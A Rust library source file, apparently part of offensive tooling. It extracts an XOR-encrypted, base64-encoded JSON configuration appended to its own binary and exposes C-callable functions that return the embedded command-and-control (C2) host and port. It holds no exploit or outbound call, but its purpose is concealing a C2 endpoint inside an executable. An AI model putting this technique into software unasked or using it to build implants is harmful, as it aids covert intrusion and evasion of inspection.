//! this crate provides functions that allow for the extraction and
//! usage of a malleable configuration that has been embedded within
//! the binary itself.
//!
//! this includes simple encryption (XOR) and base64 encoding, along
//! with expecting a custom structure for the embedded configuration.
//!
//! embedded data structure:
//!
//! [N bytes of encrypted data][8 bytes holding length N]
//!
//! functions of note:
//!
//! 1. read() - rust function that will extract and process the config bytes
//! then return a Configuration struct (or error). meant to be called by
//! other rust programs.
//!
//! 2. read_cfg() - function designed to be part of a shared object or DLL
//! that can be used by C, Python, etc programs. this returns a char* holding
//! the "address:port" from the configuration.
//!
//! 3. free_memory() - function designed to free the char* created by read_cfg()
//! because the memory is owned by rust and must be freed by rust when the caller
//! is done with it. this is similar to the free() function in C.

mod extractor;
mod models;
mod transformer;

/// function designed to run through the process of extracting,
/// transforming and deserializing configuration data from the
/// current binary.
///
/// this is the main logic function of this library.
pub fn read(key: &[u8]) -> Result<models::core::Configuration, Box<dyn std::error::Error>> {
    // return an error if no key has been specified
    if key.len() < 1 {
        return Err("no encryption key specified".into());
    }

    // read configuration bytes from current binary.
    let cfg_bytes: Vec<u8> = match extractor::core::extract_cfg_bytes() {
        Ok(result) => result,
        Err(e) => return Err(e.into()),
    };

    // XOR decrypt and base64 decode the bytes extracted in the previous
    // step to get a string representation of the JSON structure holding
    // the configuration information.
    let decoded: String = match transformer::core::transform_payload(key, &cfg_bytes) {
        Ok(result) => String::from_utf8_lossy(&result).to_string(),
        Err(e) => return Err(e.into()),
    };

    // JSON deserialize the string acquired from the process above into
    // a Configuration struct.
    match transformer::core::deserialize_payload(decoded) {
        Ok(result) => Ok(result),
        Err(e) => return Err(e.into()),
    }
}

#[no_mangle]
/// function designed to read the configuration bytes and
/// return the C2 address. this will read the data from the
/// end of the binary, XOR decrypt it, Base64 decode,
/// JSON decode it, then grab the address and port from the
/// Configuration struct that resulted from the JSON decoding.
pub extern "C" fn read_cfg(raw_key: *const std::ffi::c_char) -> *const std::ffi::c_char {
    let key: &[u8];

    // if null is passed in as the key, use q as the default;
    // otherwise use the char* key passed in.
    if raw_key.is_null() {
        key = "q".as_bytes();
    } else {
        // convert the input to a CStr.
        //
        // this borrows the value from the memory that is owned
        // by the caller.
        let key_cstr: &std::ffi::CStr = unsafe { std::ffi::CStr::from_ptr(raw_key) };

        // convert the CStr holding the key to bytes so it can
        // be used later on.
        key = key_cstr.to_bytes();
    }

    // read the Configuration from the current binary.
    let configuration: models::core::Configuration = match read(key) {
        Ok(result) => result,
        Err(e) => {
            println!("ERROR READING CONFIG: {:#}", e);
            return std::ptr::null();
        }
    };

    let address: String = format!("{}:{}", configuration.host, configuration.port);

    // convert the String (rust) into a CString so it can be converted
    // into a char* and returned.
    let address_cstring: std::ffi::CString = match std::ffi::CString::new(address) {
        Ok(result) => result,
        Err(e) => {
            println!("Error converting to CString: {:#?}", e);
            return std::ptr::null();
        }
    };

    address_cstring.into_raw()
}

#[no_mangle]
/// function designed to safely free a char* pointer that
/// has been allocated by rust.
///
/// this should be called when the caller is done with the
/// memory, similar to how free(ptr) is used in C.
pub extern "C" fn free_memory(ptr: *mut std::ffi::c_char) {
    if ptr.is_null() {
        return;
    }

    let _ = unsafe { std::ffi::CString::from_raw(ptr) };
}
